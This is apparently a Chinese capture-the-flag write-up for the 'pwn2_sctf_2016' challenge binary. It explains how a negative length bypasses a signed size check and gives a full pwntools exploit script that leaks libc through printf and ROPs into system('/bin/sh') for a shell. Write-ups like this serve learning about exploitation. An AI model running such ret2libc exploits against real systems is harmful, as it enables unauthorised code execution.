首先检查程序的安全机制

![image-20201112091158929](https://static.hack1s.fun/images/2021/02/06/image-20201112091158929.png)

反编译main函数

![image-20201112091459158](https://static.hack1s.fun/images/2021/02/06/image-20201112091459158.png)

这里存在的问题是这个v2没有转换为unsigned来判断，输入一个负数之后就可以绕过`v2>32`的逻辑

然后后面又把v2当作`%u`来读数据

所以输入一个负数以后溢出即可，后面就是比较常规的ROP

![image-20201112091841744](https://static.hack1s.fun/images/2021/02/06/image-20201112091841744.png)

程序里面有这样一个`do_thing`的函数，里面有一个`int 80h`的gadget

通过这个gadget可以调用系统调用，前面只要对eax赋值就可以了

或者也可以用常规的printf泄漏libc的基地址

前面那个思路没有找到对eax赋值的gadget

最后用printf泄漏基地址做的

```python
from pwn import *
from LibcSearcher import *

io = remote('node3.buuoj.cn',25094)
#io = process('./pwn2_sctf_2016')
elf = ELF('./pwn2_sctf_2016')

plt_printf = elf.plt['printf']
got_printf = elf.got['printf']
vuln = elf.sym['vuln']
format_str = 0x8048702

io.recvuntil('read? ')
io.sendline(str(-1))

io.recvuntil('data!\n')

payload = 'a'*0x2c + 'b'*0x4 + p32(plt_printf) + p32(vuln) + p32(format_str) + p32(got_printf)
io.sendline(payload)

io.recvuntil('\n')

real_printf = u32(io.recv(4))
libc = LibcSearcher('printf',real_printf)

libc_base = real_printf - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

io.recvuntil('read? ')
io.sendline(str(-1))

io.recvuntil('data!\n')
payload = 'a'*0x2c + 'b'*0x4 + p32(system_addr) + p32(vuln) + p32(binsh)
io.sendline(payload)

io.interactive()
```

这个match到的libc有十多个，选的怀疑人生

甚至都觉得自己的exp写错了

最后正确的是这个版本

![image-20201112102913739](https://static.hack1s.fun/images/2021/02/06/image-20201112102913739.png)

